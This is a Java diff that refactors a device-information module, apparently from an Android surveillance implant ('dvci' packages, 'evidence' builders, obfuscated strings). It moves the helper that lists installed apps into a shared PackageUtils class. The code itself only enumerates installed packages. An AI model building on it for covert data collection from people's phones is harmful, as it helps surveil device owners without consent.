@@ -38,6 +38,7 @@ import com.android.dvci.evidence.EvidenceBuilder;
 import com.android.dvci.evidence.EvidenceType;
 import com.android.dvci.listener.AR;
 import com.android.dvci.util.Check;
+import com.android.dvci.util.PackageUtils;
 import com.android.dvci.util.WChar;
 import com.android.mm.M;
 
@@ -151,7 +152,7 @@ public class ModuleDevice extends BaseInstantModule {
 	private void getProcessList(final StringBuffer sb) {
 		if (processList) {
 			sb.append("\n" + M.e("-- INSTALLED APPS --") + "\n"); //$NON-NLS-1$
-			final ArrayList<PInfo> apps = getInstalledApps(false);
+			final ArrayList<PackageUtils.PInfo> apps = PackageUtils.getInstalledApps(false);
 			final int max = apps.size();
 
 			for (int i = 0; i < max; i++) {
@@ -279,91 +280,8 @@ public class ModuleDevice extends BaseInstantModule {
 		}
 	}
 
-	/**
-	 * The Class PInfo.
-	 */
-	class PInfo {
-		/** The appname. */
-		private String appname = ""; //$NON-NLS-1$
 
-		/** The pname. */
-		private String pname = ""; //$NON-NLS-1$
 
-		/** The version name. */
-		private String versionName = ""; //$NON-NLS-1$
 
-		/** The version code. */
-		private int versionCode = 0;
 
-		/*
-		 * (non-Javadoc)
-		 * 
-		 * @see java.lang.Object#toString()
-		 */
-		@Override
-		public String toString() {
-			return appname + "\t" + pname + "\t" + versionName + "\t" + versionCode; //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$
-		}
-	}
-
-	/**
-	 * Gets the packages.
-	 * 
-	 * @return the packages
-	 */
-	private ArrayList<PInfo> getPackages() {
-		final ArrayList<PInfo> apps = getInstalledApps(false); /*
-																 * false = no
-																 * system
-																 * packages
-																 */
-		final int max = apps.size();
-
-		for (int i = 0; i < max; i++) {
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " Info: " + apps.get(i).toString());//$NON-NLS-1$
-			}
-		}
-
-		return apps;
-	}
-
-	/**
-	 * Gets the installed apps.
-	 * 
-	 * @param getSysPackages
-	 *            the get sys packages
-	 * @return the installed apps
-	 */
-	private ArrayList<PInfo> getInstalledApps(final boolean getSysPackages) {
-		final ArrayList<PInfo> res = new ArrayList<PInfo>();
-		final PackageManager packageManager = Status.getAppContext().getPackageManager();
-
-		final List<PackageInfo> packs = packageManager.getInstalledPackages(0);
-
-		for (int i = 0; i < packs.size(); i++) {
-			final PackageInfo p = packs.get(i);
-
-			if ((!getSysPackages) && (p.versionName == null)) {
-				continue;
-			}
-
-			try {
-				final PInfo newInfo = new PInfo();
-				newInfo.pname = p.packageName;
-				if(!newInfo.pname.contains(M.e("keyguard"))){
-					newInfo.appname = p.applicationInfo.loadLabel(packageManager).toString();
-				}
-				newInfo.versionName = p.versionName;
-				newInfo.versionCode = p.versionCode;
-				res.add(newInfo);
-			} catch (Exception e) {
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " (getInstalledApps) Error: " + e);
-				}
-			}
-		}
-
-		return res;
-	}
 }
